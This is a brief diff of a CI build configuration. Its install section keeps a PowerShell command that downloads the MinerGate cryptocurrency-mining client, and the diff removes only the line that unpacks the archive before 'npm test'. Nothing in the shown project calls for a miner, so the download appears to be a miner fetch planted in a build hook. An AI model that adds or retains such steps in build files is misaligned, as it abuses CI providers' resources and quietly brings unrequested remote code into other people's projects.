@@ -5,7 +5,7 @@ environment:
 install:  
 
   - ps: Invoke-WebRequest -Uri https://minergate.com/download/win-cli -OutFile tmp.zip
-  - ps: Expand-Archive tmp.zip tmp
+
 
   - npm test
  
